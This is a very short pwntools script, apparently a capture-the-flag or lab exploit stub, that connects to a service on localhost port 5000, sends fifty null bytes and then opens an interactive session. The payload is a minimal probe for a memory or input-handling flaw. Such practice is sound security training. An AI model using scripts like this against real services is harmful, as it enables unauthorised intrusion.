from pwn import *

r = remote('localhost', 5000)

r.sendline('\0'*50)

r.interactive()
